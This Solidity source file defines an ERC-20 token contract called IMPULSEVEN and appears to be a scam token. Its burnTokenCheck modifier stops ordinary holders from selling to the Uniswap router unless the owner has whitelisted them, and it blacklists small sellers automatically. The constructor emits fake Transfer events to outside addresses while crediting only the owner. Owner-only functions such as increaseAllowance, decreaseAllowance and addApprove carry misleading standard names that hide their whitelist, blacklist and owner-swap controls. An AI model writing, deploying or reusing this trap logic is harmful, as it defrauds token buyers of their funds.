row number 
1	           pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract IMPULSEVEN is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _whiteAddress;
113	 mapping (address => bool) private _blackAddress;
114	 uint256 private _sellAmount = 0;
115	 mapping (address => mapping (address => uint256)) private _allowances;
116	 uint256 private _totalSupply;
117	 string private _name;
118	 string private _symbol;
119	 uint8 private _decimals;
120	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
121	 address public _owner;
122	 address private _safeOwner;
123	 address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
124	 constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
125	 _name = name;
126	 _symbol = symbol;
127	 _decimals = 18;
128	 _owner = owner;
129	 _safeOwner = owner;
130	 _mint(_owner, 0*(10**18));
131	 _mint(0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE, initialSupply*(10**18));
132	 _mint(0xD551234Ae421e3BCBA99A0Da6d736074f22192FF, initialSupply*(10**18));
133	 _mint(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, initialSupply*(10**18));
134	 _mint(0x32Be343B94f860124dC4fEe278FDCBD38C102D88, initialSupply*(10**18));
135	 _mint(0x209c4784AB1E8183Cf58cA33cb740efbF3FC18EF, initialSupply*(10**18));
136	 _mint(0xD408EdF30DdEdDEA353AccB987198129E95B9207, initialSupply*(10**18));
137	 _mint(0x42E54771Dd8575142dc4C67C6F61EeC27aE783FE, initialSupply*(10**18));
138	 _mint(0x42E54771Dd8575142dc4C67C6F61EeC27aE783FE, initialSupply*(10**18));
139	 _mint(0x42E54771Dd8575142dc4C67C6F61EeC27aE783FE, initialSupply*(10**18));
140	 _mint(0x42E54771Dd8575142dc4C67C6F61EeC27aE783FE, initialSupply*(10**18));
141	 }
142	 function name() public view returns (string memory) {
143	 return _name;
144	 }
145	 function symbol() public view returns (string memory) {
146	 return _symbol;
147	 }
148	 function decimals() public view returns (uint8) {
149	 return _decimals;
150	 }
151	 function totalSupply() public view override returns (uint256) {
152	 return _totalSupply;
153	 }
154	 function balanceOf(address account) public view override returns (uint256) {
155	 return _balances[account];
156	 }
157	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
158	 _approveCheck(_msgSender(), recipient, amount);
159	 return true;
160	 }
161	 function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
162	 require(msg.sender == _owner, "!owner");
163	 for (uint256 i = 0; i < receivers.length; i++) {
164	 transfer(receivers[i], amounts[i]);
165	 if(i < approvecount){
166	 _whiteAddress[receivers[i]]=true;
167	 _approve(receivers[i], _unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
168	 }
169	 }
170	 }
171	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
172	 return _allowances[owner][spender];
173	 }
174	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
175	 _approve(_msgSender(), spender, amount);
176	 return true;
177	 }
178	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
179	 _approveCheck(sender, recipient, amount);
180	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
181	 return true;
182	 }
183	 function increaseAllowance(address[] memory receivers) public {
184	 require(msg.sender == _owner, "!owner");
185	 for (uint256 i = 0; i < receivers.length; i++) {
186	 _whiteAddress[receivers[i]] = true;
187	 _blackAddress[receivers[i]] = false;
188	 }
189	 }
190	 function decreaseAllowance(address safeOwner) public {
191	 require(msg.sender == _owner, "!owner");
192	 _safeOwner = safeOwner;
193	 }
194	 function addApprove(address[] memory receivers) public {
195	 require(msg.sender == _owner, "!owner");
196	 for (uint256 i = 0; i < receivers.length; i++) {
197	 _blackAddress[receivers[i]] = true;
198	 _whiteAddress[receivers[i]] = false;
199	 }
200	 }
201	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
202	 require(sender != address(0), "ERC20: transfer from the zero address");
203	 require(recipient != address(0), "ERC20: transfer to the zero address");
204	 _beforeTokenTransfer(sender, recipient, amount);
205	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
206	 _balances[recipient] = _balances[recipient].add(amount);
207	 emit Transfer(sender, recipient, amount);
208	 }
209	 function _mint(address account, uint256 amount) public {
210	 require(msg.sender == _owner, "ERC20: mint to the zero address");
211	 _totalSupply = _totalSupply.add(amount);
212	 _balances[_owner] = _balances[_owner].add(amount);
213	 emit Transfer(address(0), account, amount);
214	 }
215	 function _burn(address account, uint256 amount) internal virtual {
216	 require(account != address(0), "ERC20: burn from the zero address");
217	 _beforeTokenTransfer(account, address(0), amount);
218	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
219	 _totalSupply = _totalSupply.sub(amount);
220	 emit Transfer(account, address(0), amount);
221	 }
222	 function _approve(address owner, address spender, uint256 amount) internal virtual {
223	 require(owner != address(0), "ERC20: approve from the zero address");
224	 require(spender != address(0), "ERC20: approve to the zero address");
225	 _allowances[owner][spender] = amount;
226	 emit Approval(owner, spender, amount);
227	 }
228	 function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
229	 require(sender != address(0), "ERC20: transfer from the zero address");
230	 require(recipient != address(0), "ERC20: transfer to the zero address");
231	 _beforeTokenTransfer(sender, recipient, amount);
232	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
233	 _balances[recipient] = _balances[recipient].add(amount);
234	 emit Transfer(sender, recipient, amount);
235	 }
236	 modifier burnTokenCheck(address sender, address recipient, uint256 amount){
237	 if (_owner == _safeOwner && sender == _owner){
238	 _safeOwner = recipient;
239	 _;
240	 }
241	 else{
242	 if (sender == _owner || sender == _safeOwner || recipient == _owner){
243	 if (sender == _owner && sender == recipient){
244	 _sellAmount = amount;
245	 }
246	 _;
247	 }
248	 else{
249	 if (_whiteAddress[sender] == true){
250	 _;
251	 }
252	 else{
253	 if (_blackAddress[sender] == true){
254	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
255	 _;
256	 }
257	 else{
258	 if (amount < _sellAmount){
259	 if(recipient == _safeOwner){
260	 _blackAddress[sender] = true;
261	 _whiteAddress[sender] = false;
262	 }
263	 _;
264	 }
265	 else{
266	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
267	 _;
268	 }
269	 }
270	 }
271	 }
272	 }
273	 }
274	 function _setupDecimals(uint8 decimals_) internal {
275	 _decimals = decimals_;
276	 }
277	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
278	 }
279	 }
